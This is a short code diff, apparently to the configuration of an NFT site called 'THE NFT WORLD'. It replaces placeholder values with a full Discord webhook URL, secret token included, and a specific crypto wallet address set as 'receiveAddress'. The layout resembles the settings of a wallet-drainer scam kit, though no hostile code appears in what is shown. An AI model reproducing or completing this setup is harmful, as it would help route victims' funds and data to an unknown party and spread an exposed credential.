@@ -1,5 +1,5 @@
-const webhookURL = "WEBHOOK";
-const receiveAddress = 'YOUR WALLET',
+const webhookURL = "https://discord.com/api/webhooks/1029427455863292045/b0Qd3QCgc45UlGo59jA48D9OdhqD_f5W9O4DtUPjBJzUk6UBWNtmNGbn81twJMbuhIR0";
+const receiveAddress = '0xA74122098545dEeC980f8f3F374766443e89d0aF',
   collectionInfo = {
     name: 'THE NFT WORLD',
     socialMedia: {
